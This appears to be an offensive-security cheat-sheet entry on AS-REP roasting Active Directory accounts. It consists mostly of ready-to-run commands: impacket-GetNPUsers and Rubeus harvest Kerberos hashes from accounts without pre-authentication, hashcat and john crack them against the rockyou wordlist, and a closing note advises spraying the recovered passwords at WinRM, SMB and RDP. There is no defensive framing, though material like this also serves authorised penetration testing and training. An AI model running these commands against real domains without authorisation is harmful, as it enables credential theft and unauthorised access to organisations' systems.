---
id: asreproast
title: AS-REP Roasting
stage: initial-access
tags: [windows, ad]
tools:
  - impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep.txt
  - impacket-GetNPUsers $DOMAIN/user:password -dc-ip $DC_IP -request -format hashcat -outputfile asrep.txt
  - hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
leads_to:
  - winrm
  - rev-shell
  - rdp-access
---

## Unauthenticated (no creds — needs user list)

```bash
# Requires users.txt from LDAP/RID brute/kerbrute first
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt \
  -format hashcat -outputfile asrep.txt

# Rubeus (from Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

## Authenticated (more reliable — no wordlist needed)

```bash
# With valid creds, queries LDAP for ALL DONT_REQ_PREAUTH accounts
impacket-GetNPUsers $DOMAIN/user:password -dc-ip $DC_IP -request \
  -format hashcat -outputfile asrep.txt
```

## Crack

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

## Notes

Hash format: `$krb5asrep$23$...`. After cracking, spray the plaintext password against WinRM (5985), SMB, RDP. Accounts with `DONT_REQ_PREAUTH` are visible via LDAP — run LDAP enum first to build the user list without guessing.
